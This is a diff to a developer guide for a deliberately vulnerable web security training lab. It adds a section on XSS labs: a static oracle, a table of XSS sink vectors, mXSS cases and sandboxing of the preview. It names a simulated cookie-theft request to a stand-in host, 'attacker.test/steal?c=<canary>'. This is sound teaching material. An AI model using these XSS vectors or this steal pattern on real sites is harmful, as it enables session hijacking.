@@ -153,6 +153,9 @@ case (g)). Divine resists every exploit.
 | `Reply`, `toSim(reply)`, `sendReply(res, reply, render)`, `cookiePath(base)`, `TwinCookie` | `core/sim` (`core/twin.ts`) | one page answer for both browsers: a `SimResponse` for the citadel handler, the real route's answer (cookies with their attributes, redirects through `sendSimRedirect`, a forward as a note) (section 8) |
 | `visitOf(req, res, cookieNames)`, `simVisitOf(level, r, cookieNames?)`, `Visit` | `core/sim` (`core/twin.ts`) | what a page function needs from either browser's request: level, raw query, the lab's own cookies, `base` (section 8) |
 | `REDIRECT_STATUSES` | `core/sim` | the statuses a browser follows a `Location` on (301, 302, 303, 307, 308) |
+| `newMarker()`, `xssBrowser(world, handler, { marker, canary, interact?, dom? })`, `XSS_STEAL_URL` | `core/xss` (`core/victim.ts`) | XSS labs: the player's marker call per player and level, and the admin's browser whose rendered pages run through the oracle; a payload that runs sends `GET http://attacker.test/steal?c=<canary>` to the attacker log (section 9) |
+| `previewFrame(fragment, { marker?, title?, hash? })` | `core/xss` | the vulnerable fragment, live for the player, inside `<iframe sandbox="allow-scripts" srcdoc>`; the only raw output of an XSS view (section 9) |
+| `xssOracle(html, marker, opts?)`, `linkSinks(html)`, `roundTrip(html)`, `XSS_LIMITS` | `core/xss` | the static oracle itself (sinks, marker, mXSS), the links and resources a mail would load, a sanitizer's fixed-point seam, the bounds (section 9) |
 
 `req.level` on a challenge route is already clamped to the implemented levels;
 `req.sessionId` and `req.lang` are typed. `res.locals.challenge` and
@@ -810,3 +813,164 @@ it) holds what these specs repeat, modelled on `pilgrim-lab.testkit.ts`:
 
 Engine-level twin tests live in `tests/twin.spec.ts` (a fixture lab for both browsers, `sendReply` on a fake Response,
 the cookie attributes, `visitOf`).
+
+## 9. XSS labs (`core/xss`)
+
+An XSS lab is a victim-driven lab (section 8) whose proof is "the admin's browser ran your script". The simulated
+browser runs no JavaScript, and **no player JavaScript ever runs in the server process**. A static oracle decides
+instead: parse5, the HTML5 tree builder browsers use, parses the exact bytes the admin's browser received, and a rules
+table (`core/xss/rules.ts`) says whether attacker bytes made a sink that would run the player's **marker call**
+`hvwa('<nonce>')`. The nonce is per player and level. Where a real payload would send `document.cookie` home, the
+player calls the marker. The worked example is the fixture lab XV-01 in `tests/xss-lab.spec.ts`, a reflected search at
+four levels. Import XSS things from `core/xss.ts` and sim things from `core/sim.ts`.
+
+### The recipe
+
+1. **Declare the sink in the level file.** The level builds the one fragment the lesson is about, escaping it or not
+   (section 5): `results(q): string`, `renderReview(body)`, `renderMarkdown(src)`. **One function serves both
+   browsers.** The citadel handler puts it in the admin's page, and the real route puts it in the player's preview, so
+   the oracle judges exactly what the player watches.
+2. **Keep the marker and the admin in the lab's `perSession` state.** Make both in the factory, next to the world:
+
+   ```ts
+   const labs = perSession((level): LabState => {
+     const world = simWorld();
+     const marker = newMarker(); // 16 CSPRNG hex digits; throws outside a perSession factory
+     const key = newId();         // the admin's session: what the payload steals
+     const state: LabState = {
+       world, marker, key,
+       // The canary is read when the payload runs: a signed-out admin has nothing to steal.
+       admin: xssBrowser(world, (r) => citadel(level, state, r), { marker: marker.call, canary: () => state.admin.cookies.get(SESSION) ?? '' }),
+     };
+     state.admin.cookies.set(SESSION, key); // already signed in
+     return state;
+   });
+   ```
+
+   `xssBrowser` is `world.browser(handler)` with one addition. Every page it renders goes through
+   `xssOracle(body, marker)` first, before the browser sees the answer, which is unchanged. A rendered page is any
+   answer except a followed redirect, of a type a browser renders as a document, and not a download. When the payload
+   runs, exactly one request lands in the player's attacker log: `GET http://attacker.test/steal?c=<canary>`, with no
+   Referer.
+3. **Render the preview.** The view shows the marker (escaped), the player's input (escaped, in the lab chrome) and
+   one raw value, the preview: `preview = previewFrame(level.results(q), { marker: state.marker.call, title })`, output
+   with `<%- preview %>`. Never output the raw fragment anywhere else on the page.
+4. **Wire the victim.** Use the usual presets with the XSS browser. `sendLinkAction` covers reflected and DOM XSS ("the
+   admin opens the link you send"). For stored XSS, `checkMailAction` or a custom action (`run` follows `/scroll`, the
+   page that renders the stored payload). Pass a REQUIRED `rearm` that signs the admin back in (section 8). Stored
+   payloads live in `perSession` state, bounded (cap reviews and keep the newest). A stored payload can wedge the view,
+   so these labs may define `reset` (they have no limiter).
+5. **Prove the flag.** The player reads the canary from their attacker log and completes the attack on the real lab:
+   signs in with the stolen session, or submits it. That route calls `flagFor`. At Divine the fragment is escaped, so
+   nothing fires and no canary arrives. The flag never comes from the preview: what the player sees there is
+   decorative.
+
+### What the oracle counts
+
+`xssOracle(html, marker, { insertion?, interact?, sandbox? })` answers
+`{ executes, sinks, reachedMarker, mxss, limited? }`. `executes` is true when a sink whose code contains the marker
+call would run in the page's origin.
+
+| Sink row | Runs (examples) | Does not run (examples) |
+|---|---|---|
+| element (`script`) | `<script>`, `type=module`, a JS MIME type, `src="data:,..."` | `type=text/plain`, `nomodule`, `src=http://...` (its code is not on the page), entities inside an HTML script |
+| attribute (`event-handler`) | `img src=x onerror`, `svg onload`, `body onload`, `autofocus onfocus`, `details open ontoggle` (fire by themselves: trigger `load`); `onmouseover`, `onclick` (trigger `interaction`) | unknown names (`onfoo`), `data-onload`, `onerror` on an element that never fetches, `onfocus` on one that cannot take focus, window events on anything but `body` |
+| URL scheme (`url-scheme`) | `javascript:` on `a`/`area`/`form`/`button[formaction]` (interaction), `iframe src` (load); tabs, case, entities and `%`-encoding are undone first | `img src=javascript:`, `object data=javascript:`, `meta refresh`, top-level `data:` links; a `data:` frame runs, but `isolated` |
+| `srcdoc` | the framed document's own sinks, in the page's origin | a `sandbox` without `allow-scripts`; with `allow-scripts` alone the sinks are `isolated` |
+| SVG (`svg-script`) | `<svg><script>` (entities decoded), SMIL `onbegin`/`onend`, `foreignObject` and MathML `mtext` switching back to HTML | `onload` on SVG children (`g`, `rect`) |
+| style | none: CSS is never script; `<svg><style><img onerror>` runs only because the img breaks out of foreign content | `<style>`, `style=url(javascript:...)`, `@import 'javascript:'` |
+
+- **The marker** must appear literally in the sink's code, in any quote style, with spaces, or as a method call
+  (`window.hvwa("n")`). The oracle does not parse JavaScript: obfuscation it cannot see is not proof. Another player's
+  marker, or another level's, never counts.
+- **`reachedMarker`** with `executes: false` means the payload reached the page as text: escaped, in a comment, or
+  in an attribute. A lab may say so in a note.
+- **`interact`** defaults to true: the admin reads the page and hovers and clicks it. Pass `false` for a victim who
+  only loads the page.
+- The rules were checked against headless Chrome 157 on 194 cases, both insertion modes. The cases that differ are
+  ones a harness cannot drive (opening a `<details>` with no `<summary>`; CSS animation events).
+
+### Variants the labs need
+
+- **DOM XSS and prototype pollution (SC-03, FP-11).** The server's page is benign; the lab's own client script writes
+  the sink. Give `xssBrowser` a `dom` twin, a function in the level file that mirrors the shipped script. It receives
+  each rendered page as `{ url, path, query, hash, status, body }`, where `hash` is `location.hash` exactly as the
+  browser has it. The fragment is never sent to the server, and a redirect without its own fragment keeps the link's.
+  The twin returns `{ html, insertion? }` for what the script writes. `insertion: 'innerHTML'` (the default) covers
+  innerHTML, outerHTML and insertAdjacentHTML: inserted scripts never run or fetch, but handlers do.
+  `'document'` covers document.write and createContextualFragment. Keep the twin and the shipped script in lock-step:
+  one constant, or a spec over a payload corpus. The preview runs the real script: pass
+  `previewFrame(pageHtml + script, { hash })`. A prototype-pollution twin merges into a simulated object and never
+  touches the host's `Object.prototype`. (A shared `safeishMerge` helper is engine task E3.)
+- **mXSS (SC-06).** `mxss` is true when a parse, serialize, parse round trip adds a marker sink the first parse did
+  not have. The round trip is checked with scripting on, and from a scripting-off parse when the page mentions
+  `noscript`. Judge the sanitizer's input with it, because that is what the sanitizer saw. The browser then simply
+  parses its output, and the victim's page `executes`. For Divine's "re-parse and compare", use
+  `roundTrip(html, { insertion: 'innerHTML' })` to reach a fixed point. The known corpora (MathML
+  `mglyph`/`style`, the DOMPurify form case, nested `mtext`, noscript) are pinned in `tests/xss.spec.ts` with their
+  exact round trips, so a parse5 bump that changes serialization fails there. parse5 uses HTML's classic serializer,
+  which does not escape `<` and `>` in attribute values. That is what a server-side parse and serialize sanitizer
+  produces.
+- **Served markup (SC-05, SC-09).** What the admin's browser renders depends on the response headers. No type,
+  `text/html`, `application/xhtml+xml`, `image/svg+xml` or XML are rendered; anything else (`application/octet-stream`,
+  `image/png`) and any `Content-Disposition: attachment` are not. XML types are parsed with the HTML parser, as an
+  inline `<svg>` would be. A `Content-Security-Policy: sandbox` applies; other CSP directives are not evaluated. A
+  Divine level escapes; its CSP is defence in depth, never the fix. Per the SC-05 amendment, the real route always
+  sends an inert download, and the payload fires only in the preview.
+- **HTML mail (FP-12).** Mail clients run no script. `linkSinks(html)` lists every link and resource URL in document
+  order (`a`, `area`, `form`, `img`/`srcset`, CSS `url()`/`@import` ...), parsed with scripting off as a mail client
+  parses. Build the mail's `links` from it, and classify each URL with `classifySimUrl`. It reports `link` with
+  trigger `interaction` (the admin clicks) and `resource` with trigger `load` (the client fetches it).
+
+### Bounds (`XSS_LIMITS`)
+
+parse5 is synchronous, and its worst inputs are superlinear: one tag with thousands of distinct attributes, and deep
+or misnested trees. So every oracle call is bounded **before** parsing:
+
+- at most 16 KiB of page (`htmlLength`);
+- at most 1024 tag openers (`tags`, which bounds depth and parse5's per-token scope checks);
+- a round trip only for trees at most 512 deep (parse5 serializes recursively);
+- srcdoc documents 2 deep;
+- one parse budget for the page, its frames and its re-parses;
+- a 250 ms backstop.
+
+A page over the size or tag cap is refused unparsed (`executes: false, limited: 'size' | 'tags'`), so keep citadel
+pages under 16 KiB: cap stored items, and cap uploaded SVG at 16 KiB, not 64. Measured at the caps (Node 22.22,
+parse5 8.0.1): the worst input is one tag with 16 KiB of distinct attributes, about 60 ms per oracle call warm and about
+90 ms cold. A realistic 5 KB lab page takes about 2 ms. Under heavy CPU contention the worst case reached about
+360 ms. A victim action blocks for that long at most: a self-DoS in a single-player loopback lab, like the SQL residual
+in section 4. Verdicts list at most 64 sinks, and every string kept is a copy.
+
+### Player safety
+
+- The preview is `<iframe sandbox="allow-scripts" srcdoc="...">`, never `allow-same-origin`, so it gets an opaque
+  origin: `document.cookie` and `parent.document` throw. Its document starts with a meta CSP that lets no request out
+  (`default-src 'none'`), and a shim that turns `hvwa()` and `alert()` into a text banner naming the player's own
+  marker. Checked in headless Chrome 157. A route-scoped CSP on the lab page applies inside it too, because srcdoc
+  inherits it.
+- `hvwa_sid` is HttpOnly and `SameSite=Lax`: no script anywhere reads the player's session.
+- Raw lab input reaches only the preview frame; everything else is escaped. Residual risk, accepted: all labs share
+  the loopback origin, so a payload the player pastes into their own address bar or devtools can script their own
+  platform page.
+- No route-scoped header helper exists yet (`core/http.ts setLabHeaders` is engine task E1). Until then a Divine
+  level that adds CSP sets the header on its own route only, never globally.
+
+### Testing
+
+- **The guard (`tests/xss.spec.ts`).** It holds the sink matrix, escaped negatives, mXSS corpora, marker reachability,
+  per-player isolation, bounds, `linkSinks` and the preview's attributes. It also guards imports: `core/xss/` imports
+  only parse5 and `sim/limits.ts` (the copying clip), with no dynamic `import()`, no network, file system, `vm`,
+  `child_process` or code-loading global; parse5 and entities import no Node builtin at all; `core/sim/` never
+  reaches `core/xss/`.
+- **The victim wrap (`tests/xss-victim.spec.ts`).** In process: what renders, what fires, the canary, content types,
+  CSP sandbox, the `dom` twin and its hash.
+- **A lab spec**, like XV-01, scripts the exploit as a player would. It reads the marker from the page (put it in
+  `<code data-marker>`), sends the link (`POST <lab>/victim/send-link`), reads the canary from the attacker log
+  (`attackerHits(html)`, the hit whose URL starts with `XSS_STEAL_URL`), then completes the attack.
+- **Add these cases:**
+  - the preview's srcdoc ends with `<body>` + the level's fragment + `</body></html>`;
+  - `xssOracle(labPage.text, marker)` finds the marker sinks only `isolated` (the payload never runs on the platform
+    page);
+  - Divine's librarian saw the marker as text (`labFor(...).admin.verdicts`: `reachedMarker` true, `fired` false);
+  - players and levels are isolated;
+  - a logout link does not wedge the victim (re-arm).
